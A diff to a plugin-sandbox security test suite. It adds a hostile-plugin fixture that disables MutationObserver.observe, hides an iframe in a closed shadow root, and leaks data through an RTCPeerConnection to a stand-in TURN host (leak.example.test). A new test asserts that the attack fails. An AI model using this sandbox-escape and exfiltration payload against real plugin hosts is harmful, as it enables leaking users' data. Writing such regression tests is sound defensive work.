@@ -321,6 +321,59 @@ const RESOURCE_HINT_ATTACK_HTML = `<!doctype html>
   </body>
 </html>`;
 
+/**
+ * The sweep's own machinery, one level up from the DOM methods an earlier round
+ * poisoned. `watch()` calls `observer.observe(root, ...)`, and `observe` is
+ * resolved off `MutationObserver.prototype` at mutation time — after the
+ * plugin's script has run. Replace it with a no-op and every shadow root the
+ * wrapped `attachShadow` hands out is swept once and then never watched again,
+ * so a frame appended to that root afterwards is invisible: a `MutationObserver`
+ * on `document` is never notified of mutations inside a shadow tree.
+ *
+ * This test FAILS as of 68e6bb13d — the child realm gets `RTCPeerConnection`
+ * back and reaches an attacker-chosen TURN host. The fix is to capture
+ * `MutationObserver.prototype.observe` up front like every other method the
+ * sweep uses, and call it through `Reflect.apply`.
+ */
+const OBSERVER_POISON_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
+        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
+        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
+        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
+        "{exfil:1,type:'child',tag:'TAG',ice:ice},'*');&lt;/script&gt;";
+
+      function plantInto(root, tag) {
+        var frame = document.createElement("iframe");
+        frame.setAttribute("srcdoc", CHILD.replace("TAG", tag).replace(/&lt;/g, "<").replace(/&gt;/g, ">"));
+        root.appendChild(frame);
+      }
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        try { MutationObserver.prototype.observe = function () {}; } catch (error) {}
+
+        // Closed: the wrapper is the only thing that ever sees this root, and it
+        // just lost the ability to watch it.
+        try {
+          var closedHost = document.createElement("div");
+          document.body.appendChild(closedHost);
+          var closedRoot = closedHost.attachShadow({ mode: "closed" });
+          plantInto(closedRoot, "poisoned-observe");
+        } catch (error) {}
+
+        setTimeout(function () {
+          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
+        }, 600);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
 interface Outcomes {
   windowOpen: string;
   fetch: string;
@@ -591,6 +644,38 @@ describe("a hostile plugin", () => {
     // again, the `<template shadowrootmode="closed">` inside it comes back with
     // it and nothing downstream can see the frame.
     expect(denied).toEqual(["write", "setHTMLUnsafe", "parseHTMLUnsafe"]);
+  });
+
+  it("cannot get a child realm by disarming the observer itself", async () => {
+    const childReports: string[] = [];
+    let swept = false;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as { exfil?: number; type?: string; tag?: string; ice?: string };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=${data.ice}`);
+      }
+      if (data.type === "swept") {
+        swept = true;
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(OBSERVER_POISON_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    await waitFor(() => (swept ? true : null), "the observer-poison attack to finish");
+
+    expect(childReports).toEqual([]);
   });
 
   it("cannot leak a hostname through a resource hint in its markup", async () => {
